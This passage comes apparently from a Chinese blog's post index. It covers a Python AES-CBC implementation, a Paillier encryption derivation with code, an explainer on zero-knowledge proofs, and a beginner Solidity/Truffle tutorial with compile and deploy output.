比特的区块在此步骤的循环位移的模式相同。经过行位移之后，矩阵中每一竖行，都是由输入矩阵中的每个不同行中的元素组成。Rijndael 算法的版本中，偏移量和 AES 有少许不同；对于长度 256 比特的区块，第一列仍然维持不变，第二列、第三列、第四列的偏移量分别是 1 字节、2 字节、3 字节。除此之外，行位移操作步骤在 Rijndael 和 AES 中完全相同。 列混合在列混合步骤，每一行的四个字节透过线性变换互相结合。每一行的四个元素分别当作$1, x, x^2, x^3$ 的系数，合并即为 $GF(2^{8})$ 中的一个多项式，接着将此多项式和一个固定的多项式 $c(x)=3x^{3}+x^{2}+x+2$ 在模 $x^4+1$ 下相乘。此步骤亦可视为 Rijndael 有限域之下的矩阵乘法。列混合函数接受 4 个字节的输入，输出 4 个字节，每一个输入的字节都会对输出的四个字节造成影响。因此行位移和列混合两步骤为这个密码系统提供了扩散性。 算法实现这里实现了采用 CBC 模式且密钥长度为 128 位的 AES 算法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186#!/usr/bin/env python# -*- encoding=utf-8 -*-ENCRYPT = 0DECRYPT = 1BLOCK_SIZE = 16S = [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16]S_ = [0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d]Rcon = [ 0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A, 0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A, 0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39,]round_keys = [[0] * 4] * 44def xtime(a): return (((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF) if (a &amp; 0x80) else (a &lt;&lt; 1)def convert_string_to_matrix(string): matrix = [] for i in range(16): byte = ord(string[i]) if i % 4 == 0: matrix.append([byte]) else: matrix[i / 4].append(byte) return matrixdef convert_matrix_to_string(matrix): string = '' for i in range(4): for j in range(4): string += chr(matrix[i][j]) return stringdef generate_round_keys(master_key): round_keys[:4] = convert_string_to_matrix(master_key) # print round_keys for i in range(4, 4 * 11): temp = [] if i % 4 == 0: # print round_keys[i - 4][0] # print round_keys[i - 1][0] # print Rcon[i/4] byte = round_keys[i - 4][0] ^ S[round_keys[i - 1][1]] ^ Rcon[i / 4] # print i, byte temp.append(byte) for j in range(1, 4): byte = round_keys[i - 4][j] ^ S[round_keys[i - 1][(j + 1) % 4]] # print byte temp.append(byte) else: for j in range(4): byte = round_keys[i - 4][j] ^ round_keys[i - 1][j] temp.append(byte) round_keys[i] = temp # print round_keysdef add_round_key(matrix, round_key): for i in range(4): for j in range(4): matrix[i][j] ^= round_key[i][j] return matrixdef sub_bytes(matrix, table): for i in range(4): for j in range(4): matrix[i][j] = table[matrix[i][j]] return matrixdef shift_single_row(matrix, line, n): i = 0 while i &lt; n: temp = matrix[0][line] for j in range(3): matrix[j][line] = matrix[j + 1][line] matrix[3][line] = temp i += 1 return matrixdef shift_rows(matrix, inversed=False): if inversed == True: matrix = shift_single_row(matrix, 1, 3) matrix = shift_single_row(matrix, 2, 2) matrix = shift_single_row(matrix, 3, 1) else: matrix = shift_single_row(matrix, 1, 1) matrix = shift_single_row(matrix, 2, 2) matrix = shift_single_row(matrix, 3, 3) return matrixdef mix_single_column(matrix): t = 0 for i in range(4): t ^= matrix[i] # print 'x =&gt;', t temp = matrix[0] for i in range(3): matrix[i] ^= t ^ xtime(matrix[i] ^ matrix[i + 1]) matrix[3] ^= t ^ xtime(matrix[3] ^ temp) return matrixdef mix_columns(matrix, inversed=False): if inversed == True: for i in range(4): u = xtime(xtime(matrix[i][0] ^ matrix[i][2])) v = xtime(xtime(matrix[i][1] ^ matrix[i][3])) matrix[i][0] ^= u matrix[i][1] ^= v matrix[i][2] ^= u matrix[i][3] ^= v matrix = mix_columns(matrix) else: for i in range(4): # print 'm =&gt;', matrix[i] matrix[i] = mix_single_column(matrix[i]) return matrixdef aes_cipher(block, rounds, choice): if len(block) != 16: raise ValueError(\"Block\\'s length must be 16.\") matrix = convert_string_to_matrix(block) if choice == ENCRYPT: matrix = add_round_key(matrix, round_keys[:4]) i = 1 while i &lt; rounds: matrix = sub_bytes(matrix, S) matrix = shift_rows(matrix) matrix = mix_columns(matrix) matrix = add_round_key(matrix, round_keys[4 * i:4 * i + 4]) i += 1 matrix = sub_bytes(matrix, S) matrix = shift_rows(matrix) matrix = add_round_key(matrix, round_keys[40:]) elif choice == DECRYPT: matrix = add_round_key(matrix, round_keys[40:]) matrix = shift_rows(matrix, inversed=True) matrix = sub_bytes(matrix, S_) i = rounds - 1 while i &gt; 0: matrix = add_round_key(matrix, round_keys[4 * i:4 * i + 4]) matrix = mix_columns(matrix, inversed=True) matrix = shift_rows(matrix, inversed=True) matrix = sub_bytes(matrix, S_) i -= 1 matrix = add_round_key(matrix, round_keys[:4]) return convert_matrix_to_string(matrix)def cipher(data, key, iv, rounds, choice): if len(data) % BLOCK_SIZE != 0: raise ValueError(\"Data length illegal.\") if len(key) != 16 or len(iv) != 16: raise ValueError(\"key/iv\\'s length should be 16.\") generate_round_keys(key) i = 0 result = [] while i &lt; len(data): block = data[i:i + 16] if choice == ENCRYPT: block = list(map(lambda x, y: ord(x) ^ ord(y), block, iv)) block = ''.join([chr(c) for c in block]) block = aes_cipher(block, rounds, choice) iv = block elif choice == DECRYPT: temp = block[:] block = aes_cipher(block, rounds, choice) block = list(map(lambda x, y: ord(x) ^ ord(y), block, iv)) block = ''.join([chr(c) for c in block]) iv = temp result.append(block) i += BLOCK_SIZE return ''.join(result)if __name__ == '__main__': key = '#qianfei12345678' iv = '0' * 16 ciphertext = cipher('#qianfei12345678', key, iv, 10, ENCRYPT) print ciphertext plaintext = cipher(ciphertext, key, iv, 10, DECRYPT) print plaintext Referenceshttps://en.wikipedia.org/wiki/Data_Encryption_Standardhttps://en.wikipedia.org/wiki/Advanced_Encryption_Standardhttps://csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdfhttps://blog.csdn.net/Apollon_krj/article/details/76124722https://github.com/twhiteman/pyDes/blob/master/pyDes.pyhttps://en.wikipedia.org/wiki/Triple_DEShttp://blog.niuhemoon.xyz/pages/2018/05/18/Python-Symmetric-encryption/https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdfhttps://www.cxyxiaowu.com/3239.html","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"blog.b3ale.cn/tags/crypto/"},{"name":"python","slug":"python","permalink":"blog.b3ale.cn/tags/python/"}]},{"title":"Python实现Paillier加密解密算法","slug":"Python实现Paillier加密解密算法","date":"2019-10-24T03:49:26.000Z","updated":"2019-10-25T10:57:15.763Z","comments":true,"path":"2019/10/24/Python实现Paillier加密解密算法/","link":"","permalink":"blog.b3ale.cn/2019/10/24/Python实现Paillier加密解密算法/","excerpt":"Paillier 加密系统，是 1999 年 Paillier 发明的概率公钥加密系统。基于复合剩余类的困难问题。该加密算法是一种同态加密，满足加法和数乘同态。","text":"Paillier 加密系统，是 1999 年 Paillier 发明的概率公钥加密系统。基于复合剩余类的困难问题。该加密算法是一种同态加密，满足加法和数乘同态。 IntroductionKeygen首先选择两个大素数 $p$ 和 $q$，计算出 $n$ 为 $p$ 和 $q$ 的乘积。并取一个随机数 $g$（通常取 $n+1$）。$n$ 和 $g$ 作为公钥。 然后根据卡迈克尔函数计算私钥 $\\lambda$ 为 $p-1$ 和 $q-1$ 的乘积。 Encipher加密时取一个随机数 $r$，计算出 $c \\equiv g^m r^n(mod\\ n^2)$。 Decipher解密有一点复杂。首先我们可以得到： $$c^\\lambda \\equiv (g^m r^n)^\\lambda \\equiv g^{m \\lambda} r^{n \\lambda}(mod\\ n^2)$$ 根据卡迈克尔函数，即对于任何 $\\omega \\in Z^*_{n^2}$，必定存在以下结论： $$\\omega^{n \\lambda} \\equiv 1(mod\\ n^2)$$ 那么可以得到 $c^\\lambda \\equiv g^{m \\lambda}(mod\\ n^2)$。 然后看看生成元 $g$，实际上是通过 $g=(1+\\alpha n)\\beta^n$ 得到的，并且 $\\alpha,\\beta \\in Z^*_n$。由此可得： $$c^\\lambda \\equiv (1+\\alpha n)^{m \\lambda}\\beta^{n m \\lambda} \\equiv (1+\\alpha n)^{m \\lambda}(mod\\ n^2)$$ 再根据公式 $(1+n)^x \\equiv 1+xn(mod\\ n^2)$，可以得到： $$c^\\lambda \\equiv (1+n)^{\\alpha m \\lambda} \\equiv 1+n \\alpha m \\lambda(mod\\ n^2)$$ 然后我们在此处定义一个函数 $L(x)=\\frac{x-1}{n}$，则 $L(c^\\lambda)=\\alpha m \\lambda$。 那么我们可以得到明文的计算公式为 $m \\equiv \\frac{L(c^\\lambda)}{L(g^\\lambda)} \\equiv \\frac{\\alpha m \\lambda}{\\alpha \\lambda} \\equiv m(mod\\ n)$。 Getting started通过 gmpy2 和 libnum 库实现。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/env pythonimport gmpy2import randomimport timeimport libnumdef get_prime(rs): p = gmpy2.mpz_urandomb(rs, 1024) while not gmpy2.is_prime(p): p = p + 1 return pdef L(x, n): return (x - 1) / ndef keygen(): rs = gmpy2.random_state(int(time.time())) p = get_prime(rs) q = get_prime(rs) n = p * q lmd = (p - 1) * (q - 1) #g = random.randint(1, n ** 2) g = n + 1 if gmpy2.gcd(L(gmpy2.powmod(g, lmd, n ** 2), n), n) != 1: print '[!] g is not good enough' exit() pk = [n, g] sk = lmd return pk, skdef encipher(plaintext, pk): m = libnum.s2n(plaintext) n, g = pk r = random.randint(1, n ** 2) c = gmpy2.powmod(g, m, n ** 2) * gmpy2.powmod(r, n, n ** 2) % (n ** 2) return cdef decipher(c, pk, sk): [n, g] = pk lmd = sk u = gmpy2.invert(L(gmpy2.powmod(g, lmd, n ** 2), n), n) % n m = L(gmpy2.powmod(c, lmd, n ** 2), n) * u % n plaintext = libnum.n2s(m) return plaintextif __name__ == '__main__': pk, sk = keygen() #print 'pk:', pk #print 'sk:', sk plaintext = raw_input('Please input your message: ') ciphertext = encipher(plaintext, pk) print 'Ciphertext:', ciphertext plaintext = decipher(ciphertext, pk, sk) print 'Plaintext:', plaintext ReferencesThe Paillier Cryptosystem卡迈克尔函数","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"blog.b3ale.cn/tags/crypto/"},{"name":"python","slug":"python","permalink":"blog.b3ale.cn/tags/python/"}]},{"title":"何为零知识证明","slug":"何为零知识证明","date":"2019-09-29T11:28:12.000Z","updated":"2019-10-04T10:33:07.438Z","comments":true,"path":"2019/09/29/何为零知识证明/","link":"","permalink":"blog.b3ale.cn/2019/09/29/何为零知识证明/","excerpt":"何为零知识证明？","text":"何为零知识证明？ 零知识证明，指的是示证者向验证者表明他知道某种秘密，不仅能使验证者完全确信他的确知道这个秘密，同时还保证一丁点秘密也不泄露给验证者。 童话里的零知识证明举个最简单的阿拉伯童话《一千零一夜》里的零知识证明：阿里巴巴与四十大盗的故事其中一个片段。 阿里巴巴会芝麻开门的咒语，强盗向他拷问打开山洞石门的咒语，他不想让人听到咒语，便对强盗说：「你们离我一箭之地，用弓箭指着我，你们举起右手，我念咒语打开石门，举起左手，我念咒语关上石门，如果我做不到或逃跑，你们就用弓箭射死我。」 这个方案对阿里巴巴没损失，也能帮助他们搞清楚阿里巴巴到底是否知道咒语，于是强盗们同意。强盗举起了右手，只见阿里巴巴的嘴动了几下，石门打开了；强盗举起了左手，阿里巴巴的嘴动了几下，石门又关上了。强盗有点不信，没准这是巧合，多试几次过后，他们相信了阿里巴巴。 零知识证明的优点 在使用零知识证明的时候，不降低安全性。 零知识证明工作高效，计算过程量小，双方交换信息少。 既安全、又有良好的隐私、又减少计算量。 零知识证明的性质根据零知识证明的定义和有关例子，可以得出零知识证明具有以下三个性质： 完备性（completeness）：如果证明方和验证方都是诚实的，并遵循证明过程的每一步，进行正确的计算，那么这个证明一定是成功的，验证方一定能够接受证明方。 合理性（soundness）：没有人能够假冒证明方，使这个证明成功。 零知识性（zero-knowledge）：证明过程执行完之后，验证方只获得了「证明方拥有这个知识」的信息，而没有获得关于这个知识本身的任何信息。 零知识证明的优点 随着零知识证明的使用，安全性不会降级，因为该证明具有零知识性质。 高效性。该过程计算量小，双方交换的信息量少。 安全性依赖于未解决的数学难题，如离散对数、大整数因子分解、平方根等。 许多零知识证明相关的技术避免了直接使用有政府限制的加密算法，为相关产品的出口带去优势。 证明举例例 1：A 要向 B 证明自己拥有某个房间的钥匙，假设该房间只能用钥匙打开锁，而其他任何方法都打不开。有两个方法： A 把钥匙出示给 B，B 用这把钥匙打开该房间的锁，从而证明 A 拥有该房间的正确的钥匙。 B 确定该房间内有某一物体，A 用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给 B，从而证明自己确实拥有该房间的钥匙。 后面的方法 2 属于零知识证明。好处在于在整个证明的过程中，B 始终不能看到钥匙的样子，从而避免了钥匙的泄露。 例 2：A 拥有 B 的公钥，A 没有见过 B，而 B 见过 A 的照片，某天二人偶然碰面，B 认出了 A，但 A 不能确定面前的人是否是 B，这时 B 要向 A 证明自己是 B，也有两个方法： B 把自己的私钥给 A，A 用这个私钥对某个数据加密，然后用 B 的公钥解密，如果正确，则证明对方确实是 B。 A 给出一个随机值，B 用自己的私钥对其加密，然后把加密后的数据交给 A，A 用 B 的公钥解密，如果能够得到原来的随机值，则证明对方是 B。 后面的方法属于零知识证明。 有一个缺口环形的长廊，出口和入口距离非常近（在目距之内），但走廊中间某处有一道只能用钥匙打开的门，A 要向 B 证明自己拥有该门的钥匙。采用零知识证明，则 B 看着 A 从入口进入走廊，然后又从出口走出走廊，这时 B 没有得到任何关于这个钥匙的信息，但是完全可以证明 A 拥有钥匙。 零知识证明一般的过程假设有两方人，甲方是证明者，乙方是验证者。他们在一个工作环境内有相同的一组函数和一组数值。证明开始： 甲方先发送满足条件的随机值给乙方，这个称为承诺。 乙方发送满足条件的随机值给甲方，这个称为挑战。 甲方执行一个不让乙方知道的计算，并把计算结果给乙方，这个称为响应。 乙方对响应进行验证，验证失败就退出，验证成功回到 1，然后继续顺序执行 n 次。 如果每一次乙方验证都是成功的，那么乙方就相信了和甲方之间的共识。在整个过程中没有透露任何相关秘密信息。 Referenceshttps://www.jianshu.com/p/3f524c925c34https://blog.csdn.net/liudongdong19/article/details/82884742","categories":[],"tags":[{"name":"blockchain","slug":"blockchain","permalink":"blog.b3ale.cn/tags/blockchain/"}]},{"title":"智能合约入门","slug":"智能合约入门","date":"2019-09-22T11:58:53.000Z","updated":"2019-10-03T13:18:14.322Z","comments":true,"path":"2019/09/22/智能合约入门/","link":"","permalink":"blog.b3ale.cn/2019/09/22/智能合约入门/","excerpt":"参考 Solidity 0.5.9 中文文档。","text":"参考 Solidity 0.5.9 中文文档。 Environment Ubuntu 16.04.6 IntroSolidity 是一种智能合约的高级语言，运行在 Ethereum 虚拟机（EVM）之上。它的语法接近于 JavaScript，是一种面向对象的语言。但作为一种真正意义上运行在网络上的去中心合约，它又有很多的不同，下面列举一些： 以太坊底层是基于账户，而非 UTXO 的，所以有一个特殊的 Address 的类型。用于定位用户，定位合约，定位合约的代码（合约本身也是一个账户）。 由于语言内嵌框架是支持支付的，所以提供了一些关键字，如 payable，可以在语言层面直接支持支付，而且超级简单。 存储是使用网络上的区块链，数据的每一个状态都可以永久存储，所以需要确定变量使用内存，还是区块链。 运行环境是在去中心化的网络上，会比较强调合约或函数执行的调用的方式。因为原来一个简单的函数调用变为了一个网络上的节点中的代码执行，分布式的感觉。 最后一个非常大的不同则是它的异常机制，一旦出现异常，所有的执行都将会被回撤，这主要是为了保证合约执行的原子性，以避免中间状态出现的数据不一致。 Hello World下面尝试编写 Solidity 下的 Hello World。 第一步是安装 nodejs 和 npm，然后才能安装 truffle： 123456sudo apt updatesudo apt install npm nodejs nodejs-legacysudo npm install npm -gsudo npm install n -gsudo n stable # 下载稳定版 nodesudo npm install -g truffle truffle-contract web3 --unsafe-perm=true --allow-root 安装完 truffle 后，下载 Ganache 以方便搭建本地区块链环境（Ganache 在内存中模拟了一个区块链，因此每次 Ganache 关闭之后，区块链会丢失）。下载完后双击打开软件并启动本地环境。 各部分都成功安装之后，新建一个目录，并在目录下运行 truffle init： 1234567891011121314➜ HelloWorld truffle init✔ Preparing to download✔ Downloading✔ Cleaning up temporary files✔ Setting up boxUnbox successful. Sweet!Commands: Compile: truffle compile Migrate: truffle migrate Test contracts: truffle test 简单说明一下生成的几个文件： /contracts：存放智能合约原始代码的地方。 /migrations：这是 Truffle 用来部署智能合约的功能。 /test：测试智能合约的代码放在这里，支持 js 与 sol 测试。 truffle-config.js：Truffle 的设置文档。 Solidity 中合约的含义就是一组代码（函数）和数据（状态），它们位于以太坊区块链的一个特定地址上。关键字 pragma 告知编译器源代码所适用的 Solidity 版本为 &gt;=0.4.0 及 &lt;0.7.0，为了确保合约不会在新的编译器版本中突然行为异常。 关键字 contract 即为指定合约，关键字 function 指定函数。public 指定函数的公开权限，view 用来标识那些不改变存储状态的方法（相比之下而 pure 更加严格，它修饰的方法不但不改变存贮状态，也不读取存储的变量值），returns 指定返回值的数据类型。 注意：所有的标识符（合约名称，函数名称和变量名称）都只能使用 ASCII 字符集。UTF-8 编码的数据可以用字符串变量的形式存储；小心使用 Unicode 文本，因为有些字符虽然长得相像（甚至一样），但其字符码是不同的，其编码后的字符数组也会不一样。 以下为一个简单的返回 Hello World 的函数： 1234567pragma solidity &gt;=0.4.0 &lt;0.7.0;contract HelloWorld &#123; function sayHello() public view returns (string memory) &#123; return &quot;Hello World&quot;; &#125;&#125; 然后输入 truffle compile 进行编译： 12345678910111213141516➜ HelloWorld truffle compileCompiling your contracts...===========================&gt; Compiling ./contracts/HelloWorld.sol&gt; Compiling ./contracts/Migrations.sol &gt; compilation warnings encountered:/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:4:3: Warning: Function state mutability can be restricted to pure function sayHello() public view returns (string memory) &#123; ^ (Relevant source part starts here and spans across multiple lines).&gt; Artifacts written to /home/assassinq/SmartContract/HelloWorld/build/contracts&gt; Compiled successfully using: - solc: 0.5.8+commit.23d335f2.Emscripten.clang 接下来我们需要在 migrations 下添加一个部署文件 2_deploy_contracts.js，用来待会儿对 HelloWorld.sol 的部署。部署文件的文件名要求以数字为前缀，后缀为描述。编号前缀是必需的，以便记录迁移是否成功运行，后缀纯粹是为了方便理解。 注意：编号还有记录运行迁移文件顺序的作用。 使用 artifacts.require 语句来取得准备部署的合约。使用 deployer.deploy 语句将合约部署到区块链上。这边 HelloWorld 是 contract 的名称而不是文件名。因此可以用此语法读入任一 .sol 文件中的任一合约。 12345const HelloWorld = artifacts.require(\"HelloWorld\");module.exports = function(deployer) &#123; deployer.deploy(HelloWorld);&#125;; 在确保之前的 Ganache 已经启动并生成了十个账户后，输入 truffle migrate 将合约部署到 Ganache 上。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667➜ HelloWorld truffle migrateCompiling your contracts...===========================&gt; Everything is up to date, there is nothing to compile.Starting migrations...======================&gt; Network name: &apos;ganache&apos;&gt; Network id: 5777&gt; Block gas limit: 0x6691b71_initial_migration.js====================== Deploying &apos;Migrations&apos; ---------------------- &gt; transaction hash: 0xc3b75999936e57ba192b2053a581762c1f235aad3090caea5572c3deb1d98802 &gt; Blocks: 0 Seconds: 0 &gt; contract address: 0x55a333d4f932a737E0b97af4E3F8F4E971600D43 &gt; block number: 5 &gt; block timestamp: 1569581737 &gt; account: 0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0 &gt; balance: 99.98561934 &gt; gas used: 261393 &gt; gas price: 20 gwei &gt; value sent: 0 ETH &gt; total cost: 0.00522786 ETH &gt; Saving migration to chain. &gt; Saving artifacts ------------------------------------- &gt; Total cost: 0.00522786 ETH2_deploy_contracts.js===================== Deploying &apos;HelloWorld&apos; ---------------------- &gt; transaction hash: 0x9c05c079cbdbb90a3d53fdf5e66e3a79fce1a0e5f633815068c9a82aaaf912b0 &gt; Blocks: 0 Seconds: 0 &gt; contract address: 0x4752C4f381D9e492e10daCCf9213d916bd1f8caF &gt; block number: 7 &gt; block timestamp: 1569581739 &gt; account: 0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0 &gt; balance: 99.98223486 &gt; gas used: 127201 &gt; gas price: 20 gwei &gt; value sent: 0 ETH &gt; total cost: 0.00254402 ETH &gt; Saving migration to chain. &gt; Saving artifacts ------------------------------------- &gt; Total cost: 0.00254402 ETHSummary=======&gt; Total deployments: 2&gt; Final cost: 0.00777188 ETH 最后执行 truffle console，可以使用 js 与刚才部署的合约进行交互： 1234truffle(ganache)&gt; let x = await HelloWorld.deployed()undefinedtruffle(ganache)&gt; x.sayHello()&apos;Hello World&apos; 我们还可以尝试添加一个函数 echo，可以输出我们传入的字符串： 1234567891011pragma solidity &gt;=0.4.0 &lt;0.7.0;contract HelloWorld &#123; function sayHello() public view returns (string memory) &#123; return &quot;Hello World&quot;; &#125; function echo(string memory name) public view returns (string memory) &#123; return name; &#125;&#125; 要重新编译 Truffle 项目里的合约，请切换到项目工程所在根目录。后续运行中，Truffle 将仅编译自上次编译以来有更改的合约，如果想覆盖可以使用 --all 选项。 123456789101112131415161718➜ HelloWorld truffle compileCompiling your contracts...===========================&gt; Compiling ./contracts/HelloWorld.sol &gt; compilation warnings encountered:/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:4:3: Warning: Function state mutability can be restricted to pure function sayHello() public view returns (string memory) &#123; ^ (Relevant source part starts here and spans across multiple lines).,/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:8:3: Warning: Function state mutability can be restricted to pure function echo(string memory name) public view returns (string memory) &#123; ^ (Relevant source part starts here and spans across multiple lines).&gt; Artifacts written to /home/assassinq/SmartContract/HelloWorld/build/contracts&gt; Compiled successfully using: - solc: 0.5.8+commit.23d335f2.Emscripten.clang 部署时需要加上 --reset 参数进行重新部署。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667➜ HelloWorld truffle migrate --resetCompiling your contracts...===========================&gt; Everything is up to date, there is nothing to compile.Starting migrations...======================&gt; Network name: &apos;ganache&apos;&gt; Network id: 5777&gt; Block gas limit: 0x6691b71_initial_migration.js====================== Replacing &apos;Migrations&apos; ---------------------- &gt; transaction hash: 0x73d288f20ed2d68fe565fb01e8a15ba1a591c0cfd642028b45056fc057c194e6 &gt; Blocks: 0 Seconds: 0 &gt; contract address: 0x48245c079FA8558a35629BC9b8A94b00c91eD9A9 &gt; block number: 9 &gt; block timestamp: 1569581861 &gt; account: 0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0 &gt; balance: 99.97646654 &gt; gas used: 261393 &gt; gas price: 20 gwei &gt; value sent: 0 ETH &gt; total cost: 0.00522786 ETH &gt; Saving migration to chain. &gt; Saving artifacts ------------------------------------- &gt; Total cost: 0.00522786 ETH2_deploy_contracts.js===================== Replacing &apos;HelloWorld&apos; ---------------------- &gt; transaction hash: 0x8a7ca29c50f2e2f5645a9b4c33e5ca0eb6ab50def348c2ebcfe2f6fd38d9851e &gt; Blocks: 0 Seconds: 0 &gt; contract address: 0x0d12C183e366AE74393346ae33d4b662bfB5492F &gt; block number: 11 &gt; block timestamp: 1569581862 &gt; account: 0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0 &gt; balance: 99.97130642 &gt; gas used: 215983 &gt; gas price: 20 gwei &gt; value sent: 0 ETH &gt; total cost: 0.00431966 ETH &gt; Saving migration to chain. &gt; Saving artifacts ------------------------------------- &gt; Total cost: 0.00431966 ETHSummary=======&gt; Total deployments: 2&gt; Final cost: 0.00954752 ETH 最后进行交互： 123456truffle(ganache)&gt; let x = await HelloWorld.deployed()undefinedtruffle(ganache)&gt; x.sayHello()&apos;Hello World&apos;truffle(ganache)&gt; 